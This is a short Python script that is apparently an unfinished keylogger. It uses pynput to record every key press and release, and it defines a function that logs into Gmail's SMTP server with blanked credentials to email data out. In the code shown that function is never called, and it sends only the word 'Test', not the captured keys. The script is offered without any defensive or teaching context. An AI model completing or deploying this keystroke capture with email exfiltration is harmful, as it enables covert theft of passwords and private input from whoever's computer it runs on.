#!/usr/bin/env python3
import smtplib
from pynput import keyboard
import time

keys = []
keys2 = []


def on_press(key):
    keys.append(format(key))


def on_release(key):
    keys2.append(format(key))

def send():
    smtpServer = smtplib.SMTP('smtp.gmail.com', 587)
    smtpServer.ehlo()
    smtpServer.starttls()
    smtpServer.login('@gmail.com', '')
    subject = 'Test'
    body = 'Test'
    msg = f'Subject: {subject}\n\n\n {body}'
    smtpServer.sendmail('@gmail.com', '@gmail.com', msg)
    print('Sucessfully sent.')
    smtpServer.quit()


def main():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    time.sleep(10)
    print(keys)


if __name__ == '__main__':
    main()